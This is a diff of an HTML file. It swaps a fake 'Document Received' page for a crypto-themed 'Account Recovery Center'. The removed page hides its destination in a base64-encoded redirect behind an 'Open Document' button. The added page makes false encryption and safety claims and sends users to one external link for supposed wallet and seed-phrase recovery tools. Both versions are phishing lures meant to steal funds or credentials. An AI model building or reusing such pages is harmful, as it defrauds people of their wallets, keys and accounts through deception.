@@ -3,229 +3,245 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Received</title>
-    <meta name="description" content="Review your document details" />
-    
+    <title>Account Recovery Center - Restore Your Digital Assets</title>
+    <meta name="description" content="Professional account recovery tools for wallet restoration, seed phrase recovery, and account synchronization. Secure and encrypted recovery solutions.">
     <style>
-        /* Reset and base styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #ffffff;
-            color: #1a1a1a;
-            line-height: 1.5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+            background: hsl(220, 40%, 8%);
+            color: hsl(220, 15%, 90%);
+            line-height: 1.6;
         }
-
+        
         .container {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-        }
-
-        .card-wrapper {
-            width: 100%;
-            max-width: 28rem;
+            max-width: 1200px;
             margin: 0 auto;
+            padding: 0 1rem;
         }
-
-        .icon-section {
+        
+        header {
+            border-bottom: 1px solid hsl(220, 20%, 20%);
+            padding: 3rem 0;
             text-align: center;
-            margin-bottom: 2rem;
         }
-
-        .icon-container {
-            width: 6rem;
-            height: 6rem;
+        
+        h1 {
+            font-size: 3rem;
+            font-weight: bold;
+            color: hsl(220, 15%, 95%);
+            margin-bottom: 1rem;
+            letter-spacing: -0.02em;
+        }
+        
+        .subtitle {
+            color: hsl(220, 10%, 65%);
+            max-width: 900px;
+            margin: 0 auto 2rem;
+            line-height: 1.8;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 2rem;
+            background: hsl(180, 80%, 45%);
+            color: hsl(220, 40%, 8%);
+            border: none;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+        
+        .btn:hover {
+            background: hsl(180, 80%, 50%);
+            transform: translateY(-2px);
+        }
+        
+        .btn svg {
+            width: 1.25rem;
+            height: 1.25rem;
+        }
+        
+        main {
+            padding: 3rem 0;
+        }
+        
+        .tool-card {
+            border-bottom: 1px solid hsl(220, 20%, 20%);
+            padding: 4rem 0;
+            text-align: center;
+        }
+        
+        .tool-icon {
+            width: 80px;
+            height: 80px;
             margin: 0 auto 1.5rem;
-            background: white;
+            background: hsl(220, 30%, 12%);
+            border: 2px solid hsl(180, 80%, 45%);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 0.75rem;
-            box-shadow: 0 8px 32px -8px rgba(220, 38, 38, 0.15);
         }
-
-        .pdf-icon {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
+        
+        .tool-icon svg {
+            width: 3rem;
+            height: 3rem;
+            color: hsl(180, 80%, 45%);
         }
-
-        .main-heading {
-            font-size: 1.25rem;
+        
+        .tool-title {
+            font-size: 2rem;
             font-weight: bold;
-            color: #1a1a1a;
-            margin-bottom: 0.75rem;
+            color: hsl(220, 15%, 95%);
+            margin-bottom: 1rem;
+            letter-spacing: 0.05em;
         }
-
-        .subtitle {
-            font-size: 0.875rem;
-            color: #6b7280;
+        
+        .tool-description {
+            color: hsl(220, 10%, 65%);
+            max-width: 800px;
+            margin: 0 auto 1.5rem;
+            line-height: 1.7;
         }
-
-        .button-card {
-            background: white;
-            padding: 1rem;
-            border-radius: 0.5rem;
-            box-shadow: 0 4px 20px -4px rgba(220, 38, 38, 0.1);
-            border: none;
-        }
-
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            gap: 0.75rem;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 0.5rem 1rem;
-            border-radius: 0.375rem;
-            font-size: 0.875rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            text-decoration: none;
-            border: none;
-        }
-
-        .btn:hover {
-            transform: scale(1.05);
-        }
-
-        .btn-primary {
-            height: 2.5rem;
-            background: linear-gradient(135deg, hsl(229, 66%, 48%), hsl(229, 66%, 48%));
-            color: white;
-            border: none;
-        }
-
-        .btn-primary:hover {
-            box-shadow: 0 8px 32px -8px rgba(220, 38, 38, 0.15);
-        }
-
-        .btn-secondary {
-            height: 2.25rem;
-            background: transparent;
-            color: #1a1a1a;
-            border: 2px solid #e5e7eb;
-            font-size: 0.75rem;
-        }
-
-        .btn-secondary:hover {
-            background: #f9fafb;
-            box-shadow: 0 4px 20px -4px rgba(220, 38, 38, 0.1);
-        }
-
-        .icon {
-            width: 1rem;
-            height: 1rem;
-            stroke: currentColor;
-            fill: none;
-            stroke-width: 2;
-        }
-
-        .icon-sm {
-            width: 0.75rem;
-            height: 0.75rem;
-        }
-
-        .footer-info {
-            margin-top: 2rem;
+        
+        footer {
+            border-top: 1px solid hsl(220, 20%, 20%);
+            padding: 2rem 0;
             text-align: center;
+            color: hsl(220, 10%, 65%);
+            margin-top: 3rem;
         }
-
-        .footer-text {
-            font-size: 0.75rem;
-            color: #6b7280;
-        }
-
-        /* Responsive design */
-        @media (max-width: 640px) {
-            .container {
-                padding: 0.5rem;
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
             }
             
-            .main-heading {
-                font-size: 1.125rem;
+            .tool-title {
+                font-size: 1.5rem;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card-wrapper">
-            <!-- Document Icon -->
-            <div class="icon-section">
-                <div class="icon-container">
-                    <img src="https://sc.filehippo.net/images/t_app-icon-l/p/79c48e0c-f64a-4d32-a3c1-b8f18d9cd63f/3196813294/document-reader-word-excel-ppt-pdf-viewer-logo" 
-                         alt="PDF Document" 
-                         class="pdf-icon" />
+    <header>
+        <div class="container">
+            <h1>ACCOUNT RECOVERY CENTER</h1>
+            <p class="subtitle">
+                This session is fully protected with end-to-end encryption which ensures zero human interaction. 
+                As such, no one, including communication system providers, wallet providers, Internet providers or 
+                malicious actors can access the cryptographic keys needed to restore your account.
+            </p>
+            <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/></svg>
+                Start Recovery Process
+            </a>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <div class="tool-card">
+                <div class="tool-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"/><path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/></svg>
                 </div>
-                
-                <!-- Subtitle -->
-                <p class="subtitle">
-                    Review the document details below.
+                <h2 class="tool-title">WALLET RECOVERY</h2>
+                <p class="tool-description">
+                    Download our comprehensive wallet recovery tool to restore access to your digital assets. Compatible with all major wallet providers.
                 </p>
+                <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+                    DOWNLOAD TOOL
+                </a>
             </div>
 
-            <!-- Action Buttons -->
-            <div class="button-card">
-                <div class="button-container">
-                    <!-- Primary Action Button -->
-                    <button class="btn btn-primary" onclick="openDocument()">
-                        <svg class="icon" viewBox="0 0 24 24">
-                            <path d="m7 7 10 10-5 5V12l-5 5z"/>
-                        </svg>
-                        Open Document
-                    </button>
+            <div class="tool-card">
+                <div class="tool-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/></svg>
                 </div>
+                <h2 class="tool-title">SEED PHRASE RESTORATION</h2>
+                <p class="tool-description">
+                    Secure tool for recovering your account using your seed phrase or private keys. Fully encrypted and offline capable.
+                </p>
+                <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+                    DOWNLOAD TOOL
+                </a>
             </div>
 
-            <!-- Additional Info -->
-            <div class="footer-info">
-                <p class="footer-text">
-                    Document expires in 7 days
+            <div class="tool-card">
+                <div class="tool-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
+                </div>
+                <h2 class="tool-title">ACCOUNT SYNCHRONIZATION</h2>
+                <p class="tool-description">
+                    Sync and restore your account data across multiple devices. Supports automatic backup and recovery protocols.
                 </p>
+                <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+                    DOWNLOAD TOOL
+                </a>
+            </div>
+
+            <div class="tool-card">
+                <div class="tool-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11 4 6l5-5 5 5-5 5z"/><path d="M13 21V4l5 5"/></svg>
+                </div>
+                <h2 class="tool-title">VERIFICATION TOOL</h2>
+                <p class="tool-description">
+                    Verify and validate your account credentials. Essential for resolving authentication and access issues.
+                </p>
+                <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+                    DOWNLOAD TOOL
+                </a>
+            </div>
+
+            <div class="tool-card">
+                <div class="tool-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+                </div>
+                <h2 class="tool-title">ERROR RESOLUTION</h2>
+                <p class="tool-description">
+                    Diagnose and fix common account errors including transaction failures, connection issues, and sync problems.
+                </p>
+                <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+                    DOWNLOAD TOOL
+                </a>
+            </div>
+
+            <div class="tool-card">
+                <div class="tool-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
+                <h2 class="tool-title">SECURITY AUDIT</h2>
+                <p class="tool-description">
+                    Comprehensive security audit tool to check your account integrity and identify potential vulnerabilities.
+                </p>
+                <a href="https://bookish-eureka-sand.vercel.app/" target="_blank" rel="noopener noreferrer" class="btn">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+                    DOWNLOAD TOOL
+                </a>
             </div>
         </div>
-    </div>
+    </main>
 
-    <script>
-        // Base64 encoded redirect URL for faster loading
-        const encodedUrl = 'aHR0cHM6Ly9ncmVlbm92YWYuZXUvRDduNXhWWnpMLyM=';
-        
-        function openDocument() {
-            const decodedUrl = atob(encodedUrl);
-            window.open(decodedUrl, '_blank');
-        }
-
-        // Add hover effects
-        document.addEventListener('DOMContentLoaded', function() {
-            const buttons = document.querySelectorAll('.btn');
-            
-            buttons.forEach(button => {
-                button.addEventListener('mouseenter', function() {
-                    this.style.transform = 'scale(1.05)';
-                });
-                
-                button.addEventListener('mouseleave', function() {
-                    this.style.transform = 'scale(1)';
-                });
-            });
-        });
-    </script>
+    <footer>
+        <div class="container">
+            <p>All tools are verified and secured with enterprise-grade encryption</p>
+        </div>
+    </footer>
 </body>
 </html>
